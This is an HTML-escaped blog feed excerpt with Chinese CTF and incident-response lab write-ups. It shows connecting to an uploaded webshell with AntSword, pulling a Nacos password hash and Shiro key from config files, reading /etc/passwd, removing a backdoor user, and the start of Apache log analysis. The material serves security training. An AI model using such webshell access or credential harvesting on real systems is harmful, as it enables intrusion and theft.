&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">复制文件路径
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250915163131.png" alt="image.png">&lt;br>
在蚂剑上直接测试即可&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">eci&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">ze1ghrtc5jqkajinw9f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cloudeci1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ichunqiu&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">storage&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">uploads&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2025&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">09&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">webshell_uid_68c7ce8c76b91&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">123&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250915163307.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">然后进入shell环境，查询flag
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250915163444.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{06bd88f4-e116-4f2e-b5c5-4bf352e21d00}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第八章 内存马分析-java01-nacos</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90-java01-nacos/</guid><description>&lt;img src="http://localhost:1313/images/47.webp" alt="Featured image of post 【玄机靶场】第八章 内存马分析-java01-nacos" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>靶机来源 @vulntarget&lt;br>
靶机可以采集本地搭建或者是云端调度&lt;br>
搭建链接 &lt;a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget&lt;/a>&lt;br>
ssh root@ip 密码xjnacos 启动 /var/local/下的 autorun.sh即可正常启动&lt;br>
问题 1 nacos 用户密码的密文值作为 flag 提交 flag{密文}&lt;br>
问题 2 shiro 的key为多少 shiro 的 key 请记录下来 （备注请记录下，可能有用）&lt;br>
问题 3 靶机内核版本为 flag{}&lt;br>
问题 4 尝试应急分析，运行 get_flag 然后尝试 check_flag 通过后提交 flag&lt;br>
问题 5 尝试修复 nacos 并且自行用 poc 测试是否成功&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>nacos 用户密码的密文值作为 flag 提交 flag{密文}&lt;/strong>&lt;br>
根据题目描述，连接ssh后需在/var/local下运行autorun.sh以启动nacos服务。&lt;br>
在/var/local目录下存在nacos目录，在nacos/conf/目录下发现nacos-mysql.sql,从中发 现了加密的nacos密码&lt;br>
使用命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd nacos/conf //目录下
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">查看数据库中的pass关键字：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat nacos-mysql.sql | grep pass
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331204127.png" alt="Pasted image 20250331204127">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>shiro 的key为多少 shiro 的 key 请记录下来 （请记录下来，会有用d）&lt;/strong>&lt;br>
在nacos目录下存在一个nacos_config_xxx的zip文件，下载到本地后解压后DEFAULT_GROUP文件下存在三个文件 ADMIN_API、ADMIN_CONFIG、GATEWAY。在ADMIN_CONFIG中发现shiro配置&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">其中key为 KduO0i+zUIMcNNJnsZwU9Q==
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331204553.png" alt="Pasted image 20250331204553">&lt;br>
找到这个文件夹下的这个文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">nacos&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">2.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>\&lt;span class="n">nacos&lt;/span>\&lt;span class="n">nacos_config_export_20231206050259&lt;/span>\&lt;span class="n">DEFAULT_GROUP&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331204658.png" alt="Pasted image 20250331204658">&lt;br>
打开找到权限认证的key值：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">KduO0i+zUIMcNNJnsZwU9Q==
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331204746.png" alt="Pasted image 20250331204746">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{KduO0i+zUIMcNNJnsZwU9Q==}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>靶机内核版本为 flag{}&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">vulntarget&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">nacos&lt;/span>&lt;span class="c1"># uname -a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Linux&lt;/span> &lt;span class="n">vulntarget&lt;/span> &lt;span class="mf">5.4&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">164&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">generic&lt;/span> &lt;span class="c1">#181-Ubuntu SMP Fri Sep 1 13:41:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331204949.png" alt="Pasted image 20250331204949">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{5.4.0-164-generic}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>&lt;strong>尝试修复 nacos 并且自行用 poc 测试是否成功 此题无flag&lt;/strong>&lt;br>
尝试应急分析，运行get_flag然后尝试check_flag通过后提交flag&lt;br>
找一下get-flag和check_flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">vulntarget&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="c1"># find / -name get_flag&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">vulntarget&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">get_flag&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">vulntarget&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="c1"># &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">vulntarget&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="c1"># find / -name check_flag&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">vulntarget&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">check_flag&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">vulntarget&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="c1"># &lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后运行一下看一下，这里的flag需要应急响应成功后刷新的flag才是正确的&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331205849.png" alt="Pasted image 20250331205849">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat /etc/passwd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331205930.png" alt="Pasted image 20250331205930">&lt;br>
由于存在后门用户，这里我们需要删除这个用户即可：&lt;br>
使用命令；&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">userdel -f bt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>删除bt用户，这里使用的是强制删除&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331210249.png" alt="Pasted image 20250331210249">&lt;br>
删除用户后&lt;br>
要删除bt用户之后再去执行文件&lt;br>
这里的文件删除rm -rf 这一行&lt;br>
保存文件后，去执行之前的文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331210349.png" alt="Pasted image 20250331210349">&lt;br>
尝试修复nacos并且自行用poc测试是否成功&lt;br>
这里找不到网站，网上看了大牛的wp，使用扫描器扫出来了&lt;br>
1、弱口令 2、未授权 3、SQL注入 4、认证绕过&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">pyc反编译
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://www.lddgo.net/string/pyc-compile-decompile
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第二章 日志分析- apache日志分析</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</guid><description>&lt;img src="http://localhost:1313/images/44.webp" alt="Featured image of post 【玄机靶场】第二章 日志分析- apache日志分析" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>账号密码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">root apacherizhi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ssh root@IP
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>1、提交当天访问次数最多的IP，即黑客IP：&lt;br>
2、黑客使用的浏览器指纹是什么，提交指纹的md5：&lt;br>
3、查看包含index.php页面被访问的次数，提交次数：&lt;br>
4、查看黑客IP访问了多少次，提交次数：&lt;br>
5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:&lt;br>
&lt;strong>常见日志文件位置&lt;/strong>&lt;br>
&lt;strong>Apache日志&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">访问日志：默认位置通常是&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">apache2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">（Debian&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Ubuntu）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">httpd&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">access_log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">（CentOS&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">RHEL）。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">错误日志：默认位置通常是&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">apache2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">（Debian&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Ubuntu）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">httpd&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">error_log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">（CentOS&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">RHEL）。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>SSH日志&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">身份验证日志：通常位于&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log（Debian&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Ubuntu）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">secure（CentOS&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">RHEL）。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>系统日志&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">系统日志：通常位于&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">syslog（Debian&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Ubuntu）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">messages（CentOS&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">RHEL）。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>1、提交当天访问次数最多的IP，即黑客IP：&lt;/strong>&lt;br>
使用命令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="nx">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">rn&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="nx">head&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">20&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250331110811.png" alt="Pasted image 20250331110811">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.200.2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
